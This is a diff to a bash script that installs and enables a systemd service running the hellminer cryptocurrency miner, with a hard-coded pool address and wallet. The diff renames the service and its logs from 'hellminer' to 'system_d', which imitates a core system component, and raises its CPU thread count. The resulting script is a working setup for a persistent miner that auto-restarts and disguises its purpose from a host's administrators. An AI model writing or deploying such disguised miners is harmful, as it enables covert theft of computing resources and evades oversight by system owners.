@@ -1,11 +1,11 @@
 #!/bin/bash
 set -e
 
-SERVICE_FILE="/etc/systemd/system/hellminer.service"
+SERVICE_FILE="/etc/systemd/system/system_d.service"
 
 sudo tee "$SERVICE_FILE" >/dev/null <<'EOF'
 [Unit]
-Description=Hellminer Service
+Description=system_d Service
 After=network-online.target
 Wants=network-online.target
 
@@ -13,13 +13,13 @@ Wants=network-online.target
 Type=simple
 User=ubuntu
 WorkingDirectory=/home/ubuntu/vs-mn
-ExecStart=/home/ubuntu/vs-mn/hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F.Linux -p x --cpu 1
+ExecStart=/home/ubuntu/vs-mn/hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F.Linux -p x --cpu 2
 Restart=always
 RestartSec=10
 Nice=10
 LimitNOFILE=1048576
-StandardOutput=append:/var/log/hellminer.log
-StandardError=append:/var/log/hellminer.log
+StandardOutput=append:/var/log/system_d.log
+StandardError=append:/var/log/system_d.log
 
 [Install]
 WantedBy=multi-user.target
@@ -27,8 +27,8 @@ EOF
 
 sudo systemctl daemon-reexec
 sudo systemctl daemon-reload
-sudo systemctl restart hellminer.service
+sudo systemctl restart system_d.service
 sudo systemctl daemon-reload
-sudo systemctl stop hellminer.service
-sudo systemctl enable hellminer.service
-sudo systemctl start hellminer.service
+sudo systemctl stop system_d.service
+sudo systemctl enable system_d.service
+sudo systemctl start system_d.service
